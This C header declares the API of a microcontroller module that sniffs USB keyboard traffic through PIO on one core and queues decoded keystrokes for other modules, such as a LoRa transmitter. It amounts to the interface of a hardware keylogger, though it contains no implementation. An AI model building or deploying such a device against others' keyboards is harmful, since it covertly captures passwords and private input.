/**
 * @file USBCaptureModule.h
 * @brief Independent Core 1 USB capture module with lock-free queue
 *
 * Purpose: Capture USB keystrokes on Core 1 and provide them via a lock-free
 * queue that can be consumed by other modules (e.g., CSV batcher, LoRa TX).
 *
 * Design Goals:
 * - Single responsibility: Capture USB → Store in queue
 * - NO batching (leave that to consumer modules)
 * - NO CSV formatting (leave that to consumer modules)
 * - NO flash I/O (leave that to consumer modules)
 * - Lock-free queue for safe Core1→Core0 communication
 *
 * Architecture:
 *   Core 1: USBCaptureModule runs here (PIO capture loop)
 *   Core 0: Consumer modules read queue (batching, transmission)
 *
 * Integration:
 *   // Core 1 startup:
 *   usb_capture_module_init();
 *   usb_capture_module_start();
 *
 *   // Core 1 loop:
 *   usb_capture_module_process();  // Reads PIO, pushes to queue
 *
 *   // Core 0 consumer:
 *   keystroke_event_t event;
 *   if (usb_capture_module_pop(&event)) {
 *       // Process keystroke (batch, transmit, etc.)
 *   }
 *
 * SPDX-License-Identifier: BSD-3-Clause
 */

#ifndef USB_CAPTURE_MODULE_H
#define USB_CAPTURE_MODULE_H

#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ============================================================================
 * Configuration
 * ============================================================================ */

/** Keystroke queue size (power of 2 for efficient modulo) */
#define USB_CAPTURE_QUEUE_SIZE 256

/** Maximum keystrokes to process per iteration */
#define USB_CAPTURE_MAX_PROCESS_PER_LOOP 16

/* ============================================================================
 * Data Structures
 * ============================================================================ */

/**
 * @brief Keystroke event types
 */
typedef enum {
    KEYSTROKE_TYPE_CHAR = 0,        /**< Regular character */
    KEYSTROKE_TYPE_ENTER = 1,       /**< Enter/Return key */
    KEYSTROKE_TYPE_BACKSPACE = 2,   /**< Backspace key */
    KEYSTROKE_TYPE_TAB = 3,         /**< Tab key */
    KEYSTROKE_TYPE_ESCAPE = 4,      /**< Escape key */
    KEYSTROKE_TYPE_DELETE = 5,      /**< Delete key */
    KEYSTROKE_TYPE_MODIFIER = 6     /**< Modifier-only (Ctrl, Shift, etc.) */
} keystroke_type_t;

/**
 * @brief Single keystroke event (optimized for queue storage)
 */
typedef struct {
    uint32_t timestamp_us;      /**< Microsecond timestamp */
    uint8_t scancode;           /**< HID scancode */
    uint8_t modifier;           /**< Modifier flags (Shift=0x02, Ctrl=0x01, etc.) */
    char character;             /**< ASCII character */
    keystroke_type_t type;      /**< Event type */
} __attribute__((packed)) keystroke_event_t;

/**
 * @brief Module statistics
 */
typedef struct {
    uint32_t events_captured;   /**< Total events captured */
    uint32_t events_queued;     /**< Total events pushed to queue */
    uint32_t queue_overflows;   /**< Number of queue overflow events */
    uint32_t decode_errors;     /**< Number of decode failures */
    uint32_t packets_processed; /**< Total USB packets processed */
    uint32_t current_queue_size;/**< Current number of events in queue */
} usb_capture_stats_t;

/**
 * @brief Module configuration
 */
typedef struct {
    uint8_t dp_pin;             /**< USB D+ GPIO pin */
    uint8_t dm_pin;             /**< USB D- GPIO pin */
    bool full_speed_mode;       /**< true=12Mbps, false=1.5Mbps */
} usb_capture_config_t;

/* ============================================================================
 * Public API - Core 1 Functions
 * ============================================================================ */

/**
 * @brief Initialize USB capture module (Core 1)
 *
 * Call this once during Core 1 startup, before starting capture.
 *
 * @param config Module configuration (pins, speed)
 * @return true if initialization successful
 */
bool usb_capture_module_init(const usb_capture_config_t* config);

/**
 * @brief Start USB capture (Core 1)
 *
 * Starts PIO capture and begins filling queue with keystroke events.
 *
 * @return true if capture started successfully
 */
bool usb_capture_module_start(void);

/**
 * @brief Process USB capture (Core 1)
 *
 * Call this in Core 1 main loop to:
 * - Read from PIO FIFO
 * - Decode USB packets
 * - Extract keystrokes
 * - Push events to queue
 *
 * This function is non-blocking and should be called frequently.
 *
 * @return Number of keystroke events added to queue this iteration
 */
uint32_t usb_capture_module_process(void);

/**
 * @brief Stop USB capture (Core 1)
 *
 * Stops PIO capture and cleans up resources.
 */
void usb_capture_module_stop(void);

/**
 * @brief Check if capture is running (Core 1)
 *
 * @return true if capture active
 */
bool usb_capture_module_is_running(void);

/* ============================================================================
 * Public API - Core 0 Functions (Consumer Interface)
 * ============================================================================ */

/**
 * @brief Check if keystrokes are available (Core 0/Core 1)
 *
 * Thread-safe for multi-core access.
 *
 * @return true if queue has pending events
 */
bool usb_capture_module_available(void);

/**
 * @brief Get queue count (Core 0/Core 1)
 *
 * Thread-safe for multi-core access.
 *
 * @return Number of events in queue
 */
uint32_t usb_capture_module_get_count(void);

/**
 * @brief Pop keystroke event from queue (Core 0)
 *
 * Dequeues oldest keystroke event from queue.
 * Thread-safe for Core1→Core0 communication.
 *
 * @param event Output: keystroke event
 * @return true if event retrieved, false if queue empty
 */
bool usb_capture_module_pop(keystroke_event_t* event);

/**
 * @brief Peek at next event without removing (Core 0/Core 1)
 *
 * Thread-safe for multi-core access.
 *
 * @param event Output: keystroke event (not removed from queue)
 * @return true if event available, false if queue empty
 */
bool usb_capture_module_peek(keystroke_event_t* event);

/* ============================================================================
 * Statistics and Debugging
 * ============================================================================ */

/**
 * @brief Get module statistics (Core 0/Core 1)
 *
 * Thread-safe for multi-core access.
 *
 * @param stats Output: module statistics
 */
void usb_capture_module_get_stats(usb_capture_stats_t* stats);

/**
 * @brief Reset statistics (Core 1)
 *
 * @return true if reset successful
 */
bool usb_capture_module_reset_stats(void);

/**
 * @brief Print module statistics to stdout (Core 0/Core 1)
 *
 * Thread-safe for multi-core access.
 */
void usb_capture_module_print_stats(void);

#ifdef __cplusplus
}
#endif

#endif /* USB_CAPTURE_MODULE_H */
